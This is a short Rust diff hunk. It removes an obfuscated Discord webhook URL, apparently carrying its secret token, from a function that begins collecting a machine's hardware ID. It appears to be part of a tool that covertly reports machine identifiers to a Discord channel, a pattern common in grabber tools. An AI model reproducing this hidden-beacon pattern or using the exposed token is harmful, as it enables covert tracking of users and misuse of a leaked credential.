@@ -34,7 +34,7 @@ fn message_box(text: &str) {
 }
 
 async fn client_webhook() -> WebhookResult<()> {
-    let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069733455920910447/eX0tFN3qNdMPDbZmT05Jr8_rths_3WQpRN2Cqs9aDErUIZdBtXnsHkJaAnneSNfk8chP"));
+    let client = WebhookClient::new(obfstr::obfstr!(""));
 
     let hwid = {
         use uniqueid::{IdentifierBuilder, IdentifierType};
